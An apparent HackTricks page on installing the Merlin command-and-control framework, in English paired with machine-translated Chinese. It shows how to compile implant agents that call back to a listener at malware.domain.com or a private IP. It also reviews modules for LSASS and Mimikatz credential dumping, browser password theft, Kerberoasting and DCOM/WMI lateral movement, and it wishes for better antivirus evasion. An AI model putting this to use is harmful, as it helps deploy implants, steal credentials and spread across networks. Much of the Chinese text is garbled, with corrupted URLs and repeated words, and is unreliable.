

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


# Installation

## Install GO

```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```

## Install Merlin

```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```

# Launch Merlin Server

```
go run cmd/merlinserver/main.go -i
```

# Merlin Agents

You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)

您可以[下载预编译代理]（https://github.com/ne0nd0g/merlin/releases）

## Compile Agents

Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_

转到主文件夹_ $ gopath/src/github.com/ne0nd0g/merlin/_

```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```

## **Manual compile agents**

```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```

# Modules

**The bad news is that every module used by Merlin is downloaded from the source (Github) and saved on disk before using it. Be careful about when using well-known modules because Windows Defender will catch you!**

**坏消息是，Merlin使用的每个模块都是从源（GitHub）下载并在使用磁盘上保存在磁盘上的。 使用众所周知的模块时要小心，因为Windows Defender会抓住您！**


**SafetyKatz** --> Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file\

** Safety Katz **  - >修改的Mimikatz。 dump lsass要文件和启动：sekurlsa :: logonpasswords to该文件\
**SharpDump** --> minidump for the process ID specified (LSASS by default) (Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file)\

** SharpDump **  - >指定的流程ID（默认情况下为LSASS）的Minidump（ITSAIS认为最终文件的扩展为.gz，但实际上是bin，但IS是AGZ文件）\
**SharpRoast** --> Kerberoast (doesn't work)\

** Sharproast **  - > kerberoast（不起作用）\
**SeatBelt** --> Local Security Tests in CS (does not work) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\

**安全带**  - > CS中的本地安全测试（不起作用）
**Compiler-CSharp** --> Compile using csc.exe /unsafe\

** compiler-csharp **  - >使用csc.exe /unsafe \编译**Sharp-Up** -->Allchecks in C# in powerup (works)\

**敏锐的**  - > c＃in PowerUp（Works）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool (doesn't works, need to load: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\

** inveigh **  - > powerShelladidns/llmnr/mdns/nbns spoofer和man-in-the-middle工具（不起作用，需要加载：https：//raw.githubusercontent.com/kevin-robertson/kevin-robertson/kevin-robertson/inveigh /master/inveigh.ps1）\
**Invoke-InternalMonologue** --> Impersonates all available users and retrieves a challenge-response for each (NTLM hash for each user) (bad url)\

**调用内部原理**  - >模拟所有可用用户，并检索每个用户的挑战响应（每个用户的NTLM哈希）（不良URL）\
**Invoke-PowerThIEf** --> Steal forms from IExplorer or make it execute JS or inject a DLL in that process (doesnt work) (and the PS looks like doesnt work either) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\

** instoke-poperthief **  - >从iexplorer中窃取表单或使其在该过程中执行JS或注入DLL（不起作用）（PS看起来也不起作用） Indoke-PowerThief/blob/master/indoke-powerthief.ps1 \
**LaZagneForensic** --> Get browser passwords (works but dont prints the output directory)\

** Lazagne Forensic **  - >获取浏览器密码（工作但不打印输出目录）\
**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\

** dumpcredstore **  - > win32凭证经理API（https://github.com/zetlen/clortho/blob/blob/master/master/credman.ps1）https://wwwww.digitalcitizen.life/credential.life/credential-where-where-where-where-where-where-wind-windows  - 商店passwords-其他login-details \
**Get-InjectedThread** --> Detect classic injection in running processes (Classic Injection (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (doesnt works)\

** Get InjextedThread **  - >检测跑步过程中的经典注入（经典注入（OpenProcess，VirtualAlloCex，WriteProcessMemory，CreateMoteThread））（不起作用）\
**Get-OSTokenInformation** --> Get Token Info of the running processes and threads (User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\

** Get-stokenInformation **  - >获取运行过程和线程的令牌信息（用户，组，特权，所有者… ne-winnt- \ _ token_information_class）\
**Invoke-DCOM** --> Execute a command (inother computer) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\

** Invoke-dcom **  - >通过DCOM（http://www.enigma0x3.net。）执行命令（inother Computer）（https：//enigma0x3.net/2017/09/11/lateralalalal-movement-movement-movement-movement-movement-movement-movement-movement-movement-movement-movement-movement-movement-movement-ect一下 使用 -  excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> Execute a command in othe PC abusing PowerPoint COM objects (ADDin)\

** Indoke-dcom PowerPoint Pivot **  - >在其他PC中执行命令，滥用PowerPoint com对象（addin）\
**Invoke-ExcelMacroPivot** --> Execute a command in othe PC abusing DCOM in Excel\

** Invoke-excelmacropivot **  - >在excel \ excel \中滥用dcom中执行命令
**Find-ComputersWithRemoteAccessPolicies** --> (not working) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\

** find-computerswithremoteaccesspolicies **  - >（不工作）（https://labs.mwrinfosecurity.com/blog/enumerating-remerating-remote-remote-access-access-policies-policies-through-gpo/）\）
**Grouper** --> It dumps all the most interesting parts of group policy and then roots around in them for exploitable stuff. (deprecated) Take a look at Grouper2, looks really nice\

** grouper **  - >它倾倒了小组策略的所有最有趣的部分，然后扎根于它们以获取可剥削的东西。 （弃用）看一下grouper2，看起来真的很好\
**Invoke-WMILM** --> WMI to move laterally\

** Indoke-wmilm **  - > WMI横向移动\
**Get-GPPPassword** --> Look for groups.xml, scheduledtasks.xml, services.xmland datasources.xml and returns plaintext passwords (insidedomain)\

** get-gpppassword **  - >寻找groups.xml，scheduledtasks.xml，services.xmland dataSources.xml和返回明文密码（insideedomain）\
**Invoke-Mimikatz** --> Use mimikatz (default dump creds)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Check the privileges of users in computers\

** find-badprivilege **  - >检查计算机中用户的特权
**Find-PotentiallyCrackableAccounts** --> Retrieve information about user accounts associated with SPN (Kerberoasting)\

** find-potentiallycrackableAccounts **  - >检索有关与SPN（kerberoasting）关联的用户帐户的信息
**psgetsystem** --> getsystem

**Didn't check persistence modules**

**没有检查持久模块**
# Resume

I really like the feeling and the potential of the tool.\

我真的很喜欢该工具的感觉和潜力。
I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.

我希望该工具将开始从服务器下载模块，并在下载脚本时集成某种逃避。


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


